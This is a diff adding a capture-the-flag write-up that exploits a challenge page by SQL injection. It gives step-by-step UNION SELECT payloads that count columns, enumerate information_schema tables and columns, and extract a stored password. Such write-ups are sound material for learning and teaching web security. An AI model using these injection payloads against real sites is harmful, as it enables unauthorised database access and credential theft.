@@ -1,0 +1,35 @@
+We clearly have to exploit facts.html to find the password.
+Opening up the source to facts.html, we find some debugging code.
+We do not know the names of the tables initially, but we can find out the number of columns
+by doing:
+
+    admin ' order by 3 LIMIT 1 -- '
+
+This does not give us an error, but ordering by 4 does. Now if we input
+anything as one, two, or three and load from information_schema.tables with
+
+    admin ' UNION SELECT "wut" as one, "ayo" as two, "lol" as three from information_schema.tables LIMIT 1 -- '
+
+we don't get an error. Now we know that we can load info from information_schema.tables.
+However, we don't know the name of the user table or the column. To find the column, we do
+
+    admin ' UNION SELECT "wut" as one, "ayo" as two, table_name as three from information_schema.tables order by user LIMIT 1 -- '
+
+The output is 'lol', which means that the users column is column three. Now we know that anything we want to do
+is in three.
+To find the users table, we can play around a bit with the limits, but ultimately
+
+    admin ' UNION SELECT "wut" as one, "ayo" as two, table_name as three from information_schema.tables order by user LIMIT 66, 1 -- '
+
+is what we want. The output is "s'identifier" and we now know that that is the name of the table, which is s'identifier.
+In order to find the column of the password, we can do
+
+    admin ' UNION SELECT "wut" as one, "ayo" as two, column_name as three from information_schema.columns where table_name = "s'identifier"LIMIT 2, 1 -- '
+
+The output is kupuhipa, which is password in Maori. We can deduce that this must be the password column.
+By going back to one of our first payloads and modifying a bit, we can now get the actual password.
+
+    admin ' UNION SELECT "wut" as one, "ayo" as two, kupuhipa from `s'identifier` as three LIMIT 1,1 -- '
+
+(Note that the backticks are needed) This gives us the password to the login, and reveals the flag upon being
+entered into the login page.
